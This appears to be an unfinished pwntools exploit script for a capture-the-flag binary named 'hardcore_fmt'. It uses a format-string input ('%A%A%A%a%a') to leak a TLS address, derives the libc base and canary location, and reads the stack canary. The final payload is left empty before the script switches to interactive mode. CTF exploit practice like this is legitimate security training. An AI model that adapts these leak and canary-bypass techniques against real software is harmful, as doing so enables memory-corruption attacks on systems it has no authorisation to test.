#!/usr/bin/env python3
# Date: 2024-11-11 13:32:45

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './hardcore_fmt'
context.log_level = 'debug'
context.timeout = 5

io = process('./hardcore_fmt')
# io = remote('127.0.0.1', 13337)
elf = ELF('./hardcore_fmt')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def debug(gdbscript="", stop=False):
    if isinstance(io, process):
        gdb.attach(io, gdbscript=gdbscript)
        if stop:
            pause()

stop = pause
S = pause
leak = lambda name, address: log.info("{} ===> {}".format(name, hex(address)))
s   = io.send
sl  = io.sendline
sla = io.sendlineafter
sa  = io.sendafter
slt = io.sendlinethen
st  = io.sendthen
r   = io.recv
rn  = io.recvn
rr  = io.recvregex
ru  = io.recvuntil
ra  = io.recvall
rl  = io.recvline
rs  = io.recvlines
rls = io.recvline_startswith
rle = io.recvline_endswith
rlc = io.recvline_contains
ia  = io.interactive
ic  = io.close
cr  = io.can_recv



ru(b'Welcome to hard-core fmt')
sl('%A%A%A%a%a')
ru(b'20x0.0')
leaked = int(ru("p-", drop = True), 16) << 8

tls = leaked
leak('tls', tls)

canary_addr = tls + 0x28 + 1
leak('canary', canary_addr)

libc.address = leaked - 0x612500 - 0x1000 * int(sys.argv[2])
leak('libc_addr', libc.address)
r()

sl(str(canary_addr))
ru(b': ')
canary = '\0' + io.recvn(7)

pay = b''

ia()
